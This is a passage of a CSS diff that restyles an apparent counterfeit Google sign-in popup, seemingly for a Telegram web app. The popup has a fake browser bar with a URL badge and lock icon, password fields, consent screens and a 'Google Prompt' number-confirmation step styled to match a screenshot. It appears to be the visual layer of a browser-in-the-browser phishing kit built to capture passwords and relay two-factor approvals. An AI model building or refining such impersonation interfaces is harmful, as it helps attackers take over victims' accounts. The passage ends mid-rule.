@@ -2828,29 +2828,29 @@ body {
 }
 
 /* ========================================================
-   AUTHENTIC GOOGLE OAUTH POPUP MODAL WINDOW
+   AUTHENTIC GOOGLE OAUTH POPUP MODAL WINDOW (DARK GOOGLE PALETTE)
    ======================================================== */
 .google-modal-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    width: 100%;
-    height: 100vh;
-    height: 100dvh;
-    height: var(--tg-viewport-height, 100vh);
-    background: rgba(0, 0, 0, 0.75);
-    backdrop-filter: blur(10px);
-    -webkit-backdrop-filter: blur(10px);
-    z-index: 999999;
-    display: flex;
-    justify-content: center;
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    right: 0 !important;
+    bottom: 0 !important;
+    width: 100% !important;
+    height: 100vh !important;
+    height: 100dvh !important;
+    height: var(--tg-viewport-height, 100vh) !important;
+    background: rgba(0, 0, 0, 0.88) !important;
+    backdrop-filter: blur(10px) !important;
+    -webkit-backdrop-filter: blur(10px) !important;
+    z-index: 999999 !important;
+    display: flex !important;
+    justify-content: center !important;
     align-items: flex-start !important;
-    padding: 60px 10px 12px 10px !important;
-    box-sizing: border-box;
-    overflow-y: auto;
-    -webkit-overflow-scrolling: touch;
+    padding: max(env(safe-area-inset-top, 0px), 58px) 10px max(env(safe-area-inset-bottom, 0px), 20px) 10px !important;
+    box-sizing: border-box !important;
+    overflow-y: auto !important;
+    -webkit-overflow-scrolling: touch !important;
     animation: modalOverlayFade 0.25s ease-out;
 }
 
@@ -2864,87 +2864,91 @@ body {
 }
 
 .google-modal-window {
-    background: #ffffff !important;
-    max-width: min(440px, 100%) !important;
+    background: #000000 !important;
+    max-width: min(375px, calc(100vw - 16px)) !important;
     width: 100% !important;
-    border-radius: 24px !important;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 2px 10px rgba(0, 0, 0, 0.2) !important;
-    border: 1px solid rgba(255, 255, 255, 0.2) !important;
+    border-radius: 20px !important;
+    box-shadow: 0 16px 48px rgba(0, 0, 0, 0.95), 0 2px 8px rgba(0, 0, 0, 0.5) !important;
+    border: 1px solid #282a2c !important;
     display: flex !important;
     flex-direction: column !important;
     overflow: hidden !important;
     position: relative !important;
     margin: 0 auto !important;
     box-sizing: border-box !important;
-    animation: modalWindowSlide 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    animation: modalWindowSlide 0.25s cubic-bezier(0.16, 1, 0.3, 1);
 }
 
 @keyframes modalWindowSlide {
-    from { transform: translateY(20px) scale(0.97); opacity: 0; }
+    from { transform: translateY(16px) scale(0.98); opacity: 0; }
     to { transform: translateY(0) scale(1); opacity: 1; }
 }
 
 .google-window-topbar {
-    background: #f8f9fa;
-    border-bottom: 1px solid #e0e0e0;
-    padding: 10px 16px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    user-select: none;
-    -webkit-user-select: none;
+    background: #000000 !important;
+    border-bottom: 1px solid #1a1a1a !important;
+    padding: 7px 12px !important;
+    display: flex !important;
+    justify-content: space-between !important;
+    align-items: center !important;
+    user-select: none !important;
+    -webkit-user-select: none !important;
 }
 
 .google-url-badge {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    background: #ffffff;
-    border: 1px solid #dadce0;
-    border-radius: 100px;
-    padding: 3px 10px;
-    max-width: calc(100% - 36px);
-    min-width: 0;
-    box-sizing: border-box;
+    display: flex !important;
+    align-items: center !important;
+    gap: 6px !important;
+    background: #18191a !important;
+    border: 1px solid #2f3032 !important;
+    border-radius: 100px !important;
+    padding: 2px 8px !important;
+    max-width: calc(100% - 32px) !important;
+    min-width: 0 !important;
+    box-sizing: border-box !important;
 }
 
 .google-lock-icon {
-    font-size: 11px;
-    flex-shrink: 0;
+    font-size: 10px !important;
+    flex-shrink: 0 !important;
 }
 
 .google-url-text {
-    font-size: 11.5px;
-    font-weight: 500;
-    color: #5f6368;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    letter-spacing: -0.1px;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-    min-width: 0;
+    font-size: 10.5px !important;
+    font-weight: 500 !important;
+    color: #9aa0a6 !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+    letter-spacing: -0.1px !important;
+    overflow: hidden !important;
+    text-overflow: ellipsis !important;
+    white-space: nowrap !important;
+    min-width: 0 !important;
 }
 
 .google-window-close {
-    background: none;
-    border: none;
-    font-size: 16px;
-    font-weight: 600;
-    color: #5f6368;
-    cursor: pointer;
-    padding: 4px 8px;
-    border-radius: 50%;
-    transition: background 0.15s;
+    background: none !important;
+    border: none !important;
+    font-size: 14px !important;
+    font-weight: 600 !important;
+    color: #9aa0a6 !important;
+    cursor: pointer !important;
+    padding: 2px 5px !important;
+    border-radius: 50% !important;
+    transition: background 0.15s, color 0.15s !important;
 }
 
 .google-window-close:hover {
-    background: #e8eaed;
+    background: #202124 !important;
+    color: #ffffff !important;
 }
 
 .google-window-content {
-    padding: 28px 24px 20px 24px;
-    display: flex;
-    flex-direction: column;
+    padding: 14px 16px 12px 16px !important;
+    display: flex !important;
+    flex-direction: column !important;
+    background: #000000 !important;
+    color: #ffffff !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Google Sans", sans-serif !important;
 }
 
 .auth-step.google-modal-step {
@@ -2960,14 +2964,9 @@ body {
     animation: fadeInStep 0.2s ease-out;
 }
 
-@keyframes fadeInStep {
-    from { opacity: 0; transform: translateX(8px); }
-    to { opacity: 1; transform: translateX(0); }
-}
-
 .google-modal-footer {
-    border-top: 1px solid #e0e0e0;
-    padding: 12px 16px 14px 16px !important;
+    border-top: 1px solid #1f1f1f !important;
+    padding: 8px 14px 10px 14px !important;
     display: flex !important;
     flex-direction: row !important;
     justify-content: space-between !important;
@@ -2975,35 +2974,37 @@ body {
     flex-wrap: nowrap !important;
     gap: 6px !important;
     font-size: 10.5px !important;
-    color: #5f6368 !important;
-    background: #ffffff;
+    color: #9aa0a6 !important;
+    background: #000000 !important;
     box-sizing: border-box !important;
     width: 100% !important;
     overflow: hidden !important;
-    border-bottom-left-radius: 28px;
-    border-bottom-right-radius: 28px;
+    border-bottom-left-radius: 20px !important;
+    border-bottom-right-radius: 20px !important;
+}
+
+/* Hide outer footer on Google Prompt since it has its own in-card footer */
+.google-modal-window.prompt-active .google-modal-footer,
+.google-modal-window:has(#stepGooglePrompt.active) .google-modal-footer {
+    display: none !important;
 }
 
 .google-footer-lang {
     white-space: nowrap !important;
-    cursor: pointer;
-    user-select: none;
+    cursor: pointer !important;
+    user-select: none !important;
     flex-shrink: 0 !important;
     display: inline-block !important;
     font-size: 10.5px !important;
-    color: #3c4043 !important;
+    color: #9aa0a6 !important;
     font-family: Roboto, Arial, sans-serif !important;
     padding: 2px 4px !important;
     border-radius: 4px !important;
 }
 
 .google-footer-lang:hover {
-    background: #f1f3f4;
-}
-
-.google-footer-lang span {
-    white-space: nowrap !important;
-    display: inline !important;
+    background: #202124 !important;
+    color: #ffffff !important;
 }
 
 .google-footer-links {
@@ -3019,74 +3020,74 @@ body {
 
 .google-footer-links a {
     font-size: 10.5px !important;
-    color: #5f6368 !important;
+    color: #9aa0a6 !important;
     text-decoration: none !important;
     white-space: nowrap !important;
     flex-shrink: 0 !important;
 }
 
 .google-footer-links a:hover {
-    color: #1a73e8 !important;
+    color: #8ab4f8 !important;
 }
 
 .google-card-header {
-    display: flex;
-    flex-direction: column;
+    display: flex !important;
+    flex-direction: column !important;
     align-items: flex-start !important;
     text-align: left !important;
-    margin-bottom: 24px;
+    margin-bottom: 10px !important;
     width: 100% !important;
 }
 
-.google-wordmark-logo {
-    margin-bottom: 16px !important;
+.google-dark-logo-wrapper {
+    margin-bottom: 10px !important;
+    display: flex !important;
+    align-items: center !important;
+}
+
+.google-dark-g-logo {
     display: block !important;
-    width: 115px !important;
-    height: 42px !important;
-    min-width: 115px !important;
-    min-height: 42px !important;
-    margin-left: 0 !important;
-    margin-right: auto !important;
-    object-fit: contain !important;
-    object-position: left center !important;
-    align-self: flex-start !important;
+    width: 30px !important;
+    height: 30px !important;
 }
 
 .google-title {
-    font-family: 'Google Sans', Roboto, -apple-system, sans-serif !important;
-    font-size: 24px !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Google Sans", sans-serif !important;
+    font-size: 21px !important;
     font-weight: 400 !important;
-    color: #1f1f1f !important;
-    margin: 0 0 8px 0 !important;
-    line-height: 1.33 !important;
+    color: #ffffff !important;
+    margin: 0 0 5px 0 !important;
+    line-height: 1.25 !important;
     text-align: left !important;
+    letter-spacing: -0.2px !important;
 }
 
 .google-subtitle {
-    font-family: Roboto, -apple-system, sans-serif !important;
-    font-size: 14px !important;
-    color: #1f1f1f !important;
-    margin: 0 !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+    font-size: 12.5px !important;
+    color: #c4c7c5 !important;
+    margin: 0 0 8px 0 !important;
     text-align: left !important;
+    line-height: 1.4 !important;
 }
 
 .google-desc-text {
-    font-size: 14px !important;
-    color: #444746 !important;
-    line-height: 1.5 !important;
-    margin-bottom: 20px !important;
+    font-size: 12.5px !important;
+    color: #c4c7c5 !important;
+    line-height: 1.45 !important;
+    margin-bottom: 12px !important;
 }
 
-.google-user-chip {
+.google-user-chip, .google-dark-user-pill {
     display: inline-flex !important;
     align-items: center !important;
-    gap: 8px !important;
-    padding: 3px 12px 3px 5px !important;
-    border: 1px solid #c4c7c5 !important;
+    gap: 7px !important;
+    padding: 2px 9px 2px 3px !important;
+    border: 1px solid #444746 !important;
     border-radius: 100px !important;
-    background: #ffffff !important;
-    margin-top: 8px !important;
-    margin-bottom: 16px !important;
+    background: #1f1f1f !important;
+    margin-top: 2px !important;
+    margin-bottom: 12px !important;
     margin-left: 0 !important;
     margin-right: auto !important;
     cursor: pointer !important;
@@ -3095,546 +3096,309 @@ body {
 }
 
 .google-user-chip:hover {
-    background: #f8f9fa !important;
-    border-color: #747775 !important;
+    background: #282a2c !important;
+    border-color: #5f6368 !important;
 }
 
 .google-avatar-mini {
-    width: 24px !important;
-    height: 24px !important;
+    width: 18px !important;
+    height: 18px !important;
     border-radius: 50% !important;
-    background: #1a73e8 !important;
-    color: #ffffff !important;
+    background: #8ab4f8 !important;
+    color: #041e49 !important;
     font-weight: 700 !important;
-    font-size: 12px !important;
+    font-size: 10.5px !important;
     display: flex !important;
     align-items: center !important;
     justify-content: center !important;
 }
 
-.google-chip-email {
-    font-size: 14px !important;
+.google-chip-email, .google-dark-email-text {
+    font-size: 12.5px !important;
     font-weight: 500 !important;
-    color: #1f1f1f !important;
-    max-width: 220px !important;
+    color: #e3e3e3 !important;
+    max-width: 240px !important;
     overflow: hidden !important;
     text-overflow: ellipsis !important;
     white-space: nowrap !important;
 }
 
 .google-chip-chevron {
-    color: #444746 !important;
-    width: 16px !important;
-    height: 16px !important;
+    fill: #9aa0a6 !important;
+    color: #9aa0a6 !important;
+    width: 13px !important;
+    height: 13px !important;
 }
 
 .google-form-body {
-    display: flex;
-    flex-direction: column;
-    gap: 16px;
+    display: flex !important;
+    flex-direction: column !important;
+    gap: 8px !important;
+    width: 100% !important;
 }
 
 .google-input-box {
-    position: relative;
-    width: 100%;
-    margin-top: 8px;
-    margin-bottom: 8px;
+    position: relative !important;
+    width: 100% !important;
+    margin-top: 2px !important;
+    margin-bottom: 4px !important;
 }
 
 .google-input {
     width: 100% !important;
-    height: 54px !important;
-    border: 1px solid #747775 !important;
+    height: 46px !important;
+    border: 1px solid #444746 !important;
     border-radius: 4px !important;
-    padding: 16px 44px 16px 14px !important;
-    font-size: 16px !important;
-    color: #1f1f1f !important;
-    background: #ffffff !important;
+    padding: 13px 38px 13px 11px !important;
+    font-size: 14.5px !important;
+    color: #ffffff !important;
+    background: #131314 !important;
     outline: none !important;
     box-sizing: border-box !important;
     transition: border-color 0.15s ease, box-shadow 0.15s ease !important;
 }
 
 .google-input:focus {
-    border: 2px solid #0b57d0 !important;
-    padding: 15px 43px 15px 13px !important;
+    border: 2px solid #8ab4f8 !important;
+    padding: 12px 37px 12px 10px !important;
 }
 
 .google-label {
     position: absolute !important;
-    left: 12px !important;
-    top: 16px !important;
-    font-size: 16px !important;
-    color: #444746 !important;
+    left: 10px !important;
+    top: 13px !important;
+    font-size: 13.5px !important;
+    color: #9aa0a6 !important;
     pointer-events: none !important;
     transition: all 0.15s ease !important;
-    background: #ffffff !important;
+    background: #131314 !important;
     padding: 0 4px !important;
 }
 
 .google-input:focus ~ .google-label,
 .google-input:not(:placeholder-shown) ~ .google-label {
-    top: -9px !important;
-    font-size: 12px !important;
-    color: #0b57d0 !important;
+    top: -8px !important;
+    font-size: 11px !important;
+    color: #8ab4f8 !important;
     font-weight: 500 !important;
 }
 
 .google-input:not(:focus):not(:placeholder-shown) ~ .google-label {
-    color: #444746 !important;
+    color: #9aa0a6 !important;
 }
 
 .google-eye-toggle {
     position: absolute !important;
-    right: 12px !important;
+    right: 8px !important;
     top: 50% !important;
     transform: translateY(-50%) !important;
     background: transparent !important;
     border: none !important;
-    padding: 6px !important;
+    padding: 4px !important;
     cursor: pointer !important;
     display: flex !important;
     align-items: center !important;
     justify-content: center !important;
-    color: #5f6368 !important;
+    color: #9aa0a6 !important;
     z-index: 2 !important;
 }
 
-.google-link {
-    font-size: 14px !important;
-    color: #0b57d0 !important;
+.google-link, .google-dark-link {
+    font-size: 12.5px !important;
+    color: #8ab4f8 !important;
     font-weight: 500 !important;
     text-decoration: none !important;
 }
 
-.google-link:hover {
+.google-link:hover, .google-dark-link:hover {
     text-decoration: underline !important;
 }
 
 .google-hint-text {
-    font-size: 13px !important;
-    color: #444746 !important;
-    line-height: 1.42 !important;
-    margin-top: 12px !important;
+    font-size: 11.5px !important;
+    color: #9aa0a6 !important;
+    line-height: 1.4 !important;
+    margin-top: 4px !important;
+    margin-bottom: 2px !important;
 }
 
 .google-action-row {
     display: flex !important;
     justify-content: space-between !important;
     align-items: center !important;
-    margin-top: 28px !important;
+    margin-top: 12px !important;
     width: 100% !important;
 }
 
-.google-btn-primary {
-    background-color: #0b57d0 !important;
-    color: #ffffff !important;
-    font-family: 'Google Sans', Roboto, sans-serif !important;
-    font-weight: 500 !important;
-    font-size: 14px !important;
+.google-btn-primary, .google-dark-btn-submit {
+    background-color: #8ab4f8 !important;
+    color: #041e49 !important;
+    font-family: inherit !important;
+    font-weight: 600 !important;
+    font-size: 13.5px !important;
     border-radius: 100px !important;
-    padding: 10px 24px !important;
+    padding: 8px 18px !important;
     border: none !important;
     cursor: pointer !important;
-    transition: background-color 0.2s ease, box-shadow 0.2s ease !important;
+    transition: background-color 0.15s ease, box-shadow 0.15s ease !important;
     box-shadow: none !important;
+    box-sizing: border-box !important;
+    text-align: center !important;
 }
 
-.google-btn-primary:hover {
-    background-color: #0842a0 !important;
-    box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15) !important;
+.google-btn-primary:hover, .google-dark-btn-submit:hover {
+    background-color: #a8c7fa !important;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.4) !important;
 }
 
 .google-btn-text, .google-link-btn {
     background: transparent !important;
-    color: #0b57d0 !important;
-    font-family: 'Google Sans', Roboto, sans-serif !important;
+    color: #8ab4f8 !important;
+    font-family: inherit !important;
     font-weight: 500 !important;
-    font-size: 14px !important;
+    font-size: 13px !important;
     border: none !important;
-    padding: 10px 12px !important;
+    padding: 6px 8px !important;
     border-radius: 4px !important;
     cursor: pointer !important;
-    transition: background-color 0.2s ease !important;
+    transition: background-color 0.15s ease !important;
 }
 
 .google-btn-text:hover, .google-link-btn:hover {
-    background-color: #f0f4f9 !important;
+    background-color: rgba(138, 180, 248, 0.08) !important;
 }
 
-.google-prompt-card {
-    background: #f0f4f9 !important;
-    border-radius: 16px !important;
-    padding: 24px !important;
-    text-align: center !important;
-    margin: 16px 0 !important;
-}
-
-.google-prompt-number {
-    font-size: 48px !important;
-    font-weight: 700 !important;
-    color: #0b57d0 !important;
-    margin-bottom: 12px !important;
-}
-
-.google-prompt-text {
-    font-size: 14px !important;
-    color: #1f1f1f !important;
-}
-
-.google-consent-list {
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-    margin: 12px 0;
-}
-
-.google-consent-item {
-    display: flex;
-    align-items: flex-start;
-    gap: 12px;
-    padding: 12px;
-    background: #f8f9fa;
-    border-radius: 12px;
-}
-
-.google-consent-item strong {
-    display: block;
-    font-size: 14px;
-    color: #1f1f1f;
-}
-
-.google-consent-item span {
-    font-size: 12px;
-    color: #444746;
-}
-
-.google-footer {
-    display: none;
-    width: 100%;
-    max-width: 450px;
-    margin: 12px auto 24px auto;
-    padding: 0 16px;
-    justify-content: space-between;
-    align-items: center;
-    font-size: 12px;
-    color: #444746;
-    box-sizing: border-box;
-}
-
-.app-container.google-mode .google-footer {
+/* Error Messages / Notifiers */
+.google-error-msg, .google-dark-error-msg {
     display: flex !important;
+    align-items: center !important;
+    gap: 7px !important;
+    background: rgba(242, 139, 130, 0.12) !important;
+    border: 1px solid rgba(242, 139, 130, 0.35) !important;
+    border-radius: 8px !important;
+    padding: 7px 10px !important;
+    color: #f28b82 !important;
+    font-size: 12px !important;
+    line-height: 1.35 !important;
+    margin-top: 3px !important;
+    margin-bottom: 6px !important;
+    width: 100% !important;
+    box-sizing: border-box !important;
 }
 
-.google-footer-links {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 8px 16px;
-}
-
-.google-footer-links a {
-    color: #444746;
-    text-decoration: none;
-}
-
-.google-footer-links a:hover {
-    text-decoration: underline;
-}
-
-/* Authentic Google Linear Progress Bar */
-.google-progress-bar {
-    height: 4px;
-    width: 100%;
-    background-color: #e8f0fe;
-    overflow: hidden;
-    position: relative;
-}
-
-.google-progress-bar-value {
-    width: 100%;
-    height: 100%;
-    background-color: #0b57d0;
-    position: absolute;
-    animation: googleProgress 1.5s infinite ease-in-out;
-    transform-origin: 0% 50%;
-}
-
-@keyframes googleProgress {
-    0% { transform: translateX(0) scaleX(0); }
-    40% { transform: translateX(0) scaleX(0.5); }
-    100% { transform: translateX(100%) scaleX(1); }
-}
-
-/* Google Red Error State Styling */
-.google-error-msg {
-    display: flex;
-    align-items: flex-start;
-    gap: 8px;
-    font-size: 12px;
-    color: #b3261e;
-    margin-top: 4px;
-    margin-bottom: 4px;
-    line-height: 1.4;
-}
-
-.google-error-msg svg {
-    flex-shrink: 0;
-    margin-top: 2px;
-}
-
-.google-input.google-input-invalid {
-    border: 2px solid #b3261e !important;
-    padding: 15px 13px !important;
-}
-
-.google-input.google-input-invalid ~ .google-label {
-    color: #b3261e !important;
-}
-
-/* Responsive Mobile Rules for Google Modal */
-@media (max-width: 600px) {
-    .google-modal-overlay {
-        padding: 12px 8px !important;
-        align-items: center !important;
-    }
-
-    .google-modal-window {
-        width: 100% !important;
-        max-width: min(390px, calc(100vw - 16px)) !important;
-        border-radius: 24px !important;
-        margin: 0 auto !important;
-        box-sizing: border-box !important;
-    }
-
-    .google-window-content {
-        padding: 20px 16px 16px 16px !important;
-        box-sizing: border-box !important;
-    }
-
-    .google-modal-footer {
-        padding: 10px 12px 12px 12px !important;
-        flex-wrap: nowrap !important;
-        gap: 6px !important;
-        justify-content: space-between !important;
-        font-size: 10.5px !important;
-    }
-
-    .google-footer-lang {
-        font-size: 10.5px !important;
-        gap: 3px !important;
-        flex-shrink: 0 !important;
-        white-space: nowrap !important;
-    }
-
-    .google-footer-lang span {
-        font-size: 10.5px !important;
-        white-space: nowrap !important;
-    }
-
-    .google-footer-links {
-        display: flex !important;
-        align-items: center !important;
-        gap: 8px !important;
-        font-size: 10.5px !important;
-        white-space: nowrap !important;
-        flex-shrink: 0 !important;
-    }
-
-    .google-footer-links a {
-        font-size: 10.5px !important;
-        white-space: nowrap !important;
-        flex-shrink: 0 !important;
-    }
-
-    .google-card-header {
-        align-items: flex-start !important;
-        text-align: left !important;
-        margin-bottom: 16px !important;
-    }
-
-    .google-wordmark-logo {
-        margin-left: 0 !important;
-        margin-right: auto !important;
-        width: 115px !important;
-        height: 42px !important;
-        min-width: 115px !important;
-        min-height: 42px !important;
-        object-position: left center !important;
-        align-self: flex-start !important;
-    }
-
-    .google-title {
-        font-size: 24px !important;
-        font-weight: 400 !important;
-        text-align: left !important;
-    }
-
-    .google-subtitle {
-        font-size: 14px !important;
-        text-align: left !important;
-    }
-}
-
-
-
-
-
-
-
-
-/* ========================================================
-   GOOGLE DARK PROMPT STYLES (Screenshot Match)
-   ======================================================== */
-
-.google-modal-window.dark-prompt-window {
-    background: #000000 !important;
-    border: 1px solid #282a2c !important;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.95) !important;
-}
-
-.google-modal-window.dark-prompt-window .google-window-topbar {
-    background: #000000 !important;
-    border-bottom: 1px solid #1a1a1a !important;
-}
-
-.google-modal-window.dark-prompt-window .google-url-badge {
-    background: #18191a !important;
-    border-color: #2f3032 !important;
-}
-
-.google-modal-window.dark-prompt-window .google-url-text {
-    color: #9aa0a6 !important;
-}
-
-.google-modal-window.dark-prompt-window .google-window-close {
-    color: #9aa0a6 !important;
-}
-
-.google-modal-window.dark-prompt-window .google-window-close:hover {
-    background: #202124 !important;
-    color: #ffffff !important;
-}
-
-.google-modal-window.dark-prompt-window .google-window-content {
-    background: #000000 !important;
-    padding: 24px 24px 16px 24px !important;
-}
-
-.google-modal-window.dark-prompt-window .google-modal-footer {
+.google-error-msg.hidden, .google-dark-error-msg.hidden {
     display: none !important;
 }
 
+.google-input.google-input-invalid {
+    border-color: #f28b82 !important;
+}
+
+.google-input.google-input-invalid ~ .google-label {
+    color: #f28b82 !important;
+}
+
+/* Consent Screen Elements */
+.google-consent-list {
+    display: flex !important;
+    flex-direction: column !important;
+    gap: 6px !important;
+    margin: 6px 0 !important;
+}
+
+.google-consent-item {
+    display: flex !important;
+    align-items: flex-start !important;
+    gap: 8px !important;
+    padding: 8px !important;
+    background: #18191a !important;
+    border: 1px solid #282a2c !important;
+    border-radius: 8px !important;
+    color: #ffffff !important;
+    font-size: 12.5px !important;
+}
+
+.google-consent-item span {
+    color: #9aa0a6 !important;
+    font-size: 11.5px !important;
+}
+
+/* ========================================================
+   GOOGLE PROMPT SPECIFIC COMPACT STYLES (MATCHING SCREENSHOT)
+   ======================================================== */
 .google-prompt-dark-step {
     background: #000000 !important;
     color: #ffffff !important;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Google Sans', sans-serif !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Google Sans", sans-serif !important;
 }
 
 .google-dark-prompt-container {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    text-align: left;
-    width: 100%;
-    box-sizing: border-box;
-}
-
-.google-dark-logo-wrapper {
-    margin-bottom: 24px;
-    display: flex;
-    align-items: center;
-}
-
-.google-dark-g-logo {
-    display: block;
+    display: flex !important;
+    flex-direction: column !important;
+    align-items: flex-start !important;
+    text-align: left !important;
+    width: 100% !important;
+    box-sizing: border-box !important;
 }
 
 .google-dark-prompt-title {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Google Sans', sans-serif !important;
-    font-size: 26px !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Google Sans", sans-serif !important;
+    font-size: 21px !important;
     font-weight: 400 !important;
     color: #ffffff !important;
-    margin: 0 0 12px 0 !important;
+    margin: 0 0 5px 0 !important;
     line-height: 1.25 !important;
     letter-spacing: -0.2px !important;
 }
 
 .google-dark-prompt-subtitle {
-    font-size: 14px !important;
-    line-height: 1.45 !important;
+    font-size: 12.5px !important;
+    line-height: 1.4 !important;
     color: #c4c7c5 !important;
-    margin: 0 0 16px 0 !important;
+    margin: 0 0 8px 0 !important;
     font-weight: 400 !important;
 }
 
-.google-dark-link {
-    color: #8ab4f8 !important;
-    text-decoration: none !important;
-    font-weight: 500 !important;
-}
-
-.google-dark-link:hover {
-    text-decoration: underline !important;
-}
-
-.google-dark-user-pill {
-    display: inline-flex !important;
-    align-items: center !important;
-    gap: 8px !important;
-    margin-bottom: 28px !important;
-    padding: 2px 0 !important;
-}
-
 .google-dark-user-icon {
-    flex-shrink: 0;
-    fill: #e3e3e3;
-}
-
-.google-dark-email-text {
-    font-size: 14px !important;
-    color: #e3e3e3 !important;
-    font-weight: 500 !important;
-    white-space: nowrap !important;
-    overflow: hidden !important;
-    text-overflow: ellipsis !important;
-    max-width: 280px !important;
+    flex-shrink: 0 !important;
+    fill: #e3e3e3 !important;
 }
 
 .google-dark-hero-box {
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin: 16px 0 28px 0;
+    width: 100% !important;
+    display: flex !important;
+    justify-content: center !important;
+    align-items: center !important;
+    margin: 4px 0 10px 0 !important;
 }
 
 .google-dark-hero-number {
-    font-size: 68px !important;
+    font-size: 50px !important;
     font-weight: 700 !important;
     color: #ffffff !important;
     line-height: 1 !important;
     letter-spacing: 2px !important;
     text-align: center !important;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
     user-select: all !important;
 }
 
 .google-dark-instructions-box {
-    width: 100%;
-    margin-bottom: 16px;
+    width: 100% !important;
+    margin-bottom: 10px !important;
 }
 
 .google-dark-instructions-title {
-    font-size: 16px !important;
+    font-size: 14px !important;
     font-weight: 500 !important;
     color: #ffffff !important;
     line-height: 1.35 !important;
-    margin: 0 0 10px 0 !important;
+    margin: 0 0 4px 0 !important;
 }
 
 .google-dark-instructions-desc {
-    font-size: 13.5px !important;
-    line-height: 1.45 !important;
+    font-size: 12px !important;
+    line-height: 1.4 !important;
     color: #c4c7c5 !important;
     margin: 0 !important;
 }
@@ -3645,10 +3409,10 @@ body {
 }
 
 .google-dark-help-row {
-    font-size: 13.5px !important;
+    font-size: 11.5px !important;
     color: #c4c7c5 !important;
-    margin-bottom: 24px !important;
-    line-height: 1.45 !important;
+    margin-bottom: 10px !important;
+    line-height: 1.4 !important;
 }
 
 .google-dark-help-label {
@@ -3656,18 +3420,18 @@ body {
 }
 
 .google-dark-actions-stack {
-    display: flex;
-    flex-direction: column;
-    gap: 16px;
-    width: 100%;
-    margin-bottom: 20px;
+    display: flex !important;
+    flex-direction: column !important;
+    gap: 6px !important;
+    width: 100% !important;
+    margin-bottom: 12px !important;
 }
 
 .google-dark-action-btn {
     background: transparent !important;
     border: none !important;
     color: #8ab4f8 !important;
-    font-size: 14px !important;
+    font-size: 12.5px !important;
     font-weight: 500 !important;
     text-align: left !important;
     padding: 0 !important;
@@ -3680,78 +3444,65 @@ body {
     opacity: 0.9 !important;
 }
 
-.google-dark-error-msg.hidden {
-    display: none !important;
-}
-
-.google-dark-error-msg {
-    display: flex !important;
-    align-items: center !important;
-    gap: 10px !important;
-    background: rgba(242, 139, 130, 0.12) !important;
-    border: 1px solid rgba(242, 139, 130, 0.4) !important;
-    border-radius: 8px !important;
-    padding: 10px 14px !important;
-    color: #f28b82 !important;
-    font-size: 13px !important;
-    line-height: 1.35 !important;
-    margin-bottom: 16px !important;
-    width: 100% !important;
-    box-sizing: border-box !important;
-}
-
 .google-dark-confirm-row {
-    width: 100%;
-    margin-bottom: 28px;
-}
-
-.google-dark-btn-submit {
     width: 100% !important;
-    background: #8ab4f8 !important;
-    color: #041e49 !important;
-    border: none !important;
-    border-radius: 100px !important;
-    font-size: 14px !important;
-    font-weight: 600 !important;
-    padding: 12px 24px !important;
-    cursor: pointer !important;
-    transition: background-color 0.15s ease, box-shadow 0.15s ease !important;
-    box-sizing: border-box !important;
-    text-align: center !important;
-}
-
-.google-dark-btn-submit:hover {
-    background: #a8c7fa !important;
-    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3) !important;
+    margin-bottom: 10px !important;
 }
 
 .google-dark-footer-bar {
-    width: 100%;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding-top: 16px;
-    border-top: 1px solid #1f1f1f;
-    font-size: 11px;
-    color: #80868b;
-    box-sizing: border-box;
+    width: 100% !important;
+    display: flex !important;
+    justify-content: space-between !important;
+    align-items: center !important;
+    padding-top: 8px !important;
+    border-top: 1px solid #1f1f1f !important;
+    font-size: 10px !important;
+    color: #80868b !important;
+    box-sizing: border-box !important;
 }
 
 .google-dark-footer-item {
-    color: #9aa0a6;
-    cursor: pointer;
-    white-space: nowrap;
+    color: #9aa0a6 !important;
+    cursor: pointer !important;
+    white-space: nowrap !important;
 }
 
 .google-dark-footer-chip {
-    font-size: 10px;
-    color: #9aa0a6;
-    background: #18191a;
-    border: 1px solid #2f3032;
-    padding: 3px 8px;
-    border-radius: 100px;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    max-width: 190px;
+    font-size: 9.5px !important;
+    color: #9aa0a6 !important;
+    background: #18191a !important;
+    border: 1px solid #2f3032 !important;
+    padding: 2px 6px !important;
+    border-radius: 100px !important;
+    white-space: nowrap !important;
+    overflow: hidden !important;
+    text-overflow: ellipsis !important;
+    max-width: 180px !important;
+}
+
+/* Mobile Rules Override */
+@media (max-width: 600px) {
+    .google-modal-overlay {
+        padding: max(env(safe-area-inset-top, 0px), 58px) 8px max(env(safe-area-inset-bottom, 0px), 16px) 8px !important;
+        align-items: flex-start !important;
+    }
+
+    .google-modal-window {
+        width: 100% !important;
+        max-width: min(365px, calc(100vw - 16px)) !important;
+        border-radius: 18px !important;
